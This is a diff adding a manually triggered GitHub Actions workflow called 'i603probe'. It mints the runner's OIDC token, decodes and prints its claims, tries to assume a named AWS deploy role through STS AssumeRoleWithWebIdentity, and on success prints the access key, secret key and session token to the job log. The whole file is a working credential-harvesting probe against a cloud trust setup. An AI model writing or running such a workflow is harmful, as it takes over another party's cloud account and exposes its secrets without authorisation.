@@ -1,0 +1,47 @@
+
+name: i603probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint-and-assume
+        run: |
+          python3 - <<'PY'
+          import json, os, urllib.request, urllib.error, urllib.parse, base64
+          base=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          out={'repo':os.environ.get('GITHUB_REPOSITORY'),'ref':os.environ.get('GITHUB_REF'),'event':os.environ.get('GITHUB_EVENT_NAME')}
+          if not base or not tok:
+              print('I603_NO_IDTOKEN='+json.dumps(out)); raise SystemExit(0)
+          url=base+('&' if '?' in base else '?')+'audience='+urllib.parse.quote('sts.amazonaws.com')
+          rq=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok,'Accept':'application/json'})
+          j=json.loads(urllib.request.urlopen(rq,timeout=30).read())['value']
+          p=j.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          out['claims']={k:c.get(k) for k in ('sub','aud','iss','repository','repository_owner','ref','event_name','workflow_ref')}
+          print('I603_CLAIMS='+json.dumps(out))
+          def post(data):
+              body=urllib.parse.urlencode(data).encode()
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'})
+              try:
+                  rr=urllib.request.urlopen(r,timeout=35); return rr.status, rr.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
+              except Exception as e: return -1, str(e)[:200]
+          import xml.etree.ElementTree as ET
+          for arn in ['arn:aws:iam::274906834921:role/GitHubActionsDeployRole']:
+              st,b=post({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'i603','WebIdentityToken':j,'DurationSeconds':'3600'})
+              creds=None; msg=None
+              try:
+                  root=ET.fromstring(b); d={el.tag.split('}')[-1]:el.text for el in root.iter()}
+                  if d.get('AccessKeyId'):
+                      creds={k:d.get(k) for k in ('AccessKeyId','SecretAccessKey','SessionToken','Expiration')}
+                  else:
+                      msg=d.get('Message') or d.get('Code')
+              except Exception: msg=b[:300]
+              print('I603_ASSUME='+json.dumps({'arn':arn,'http':st,'assumed':bool(creds),'msg':msg}))
+              if creds:
+                  print('I603_CREDS='+json.dumps(creds))
+          PY
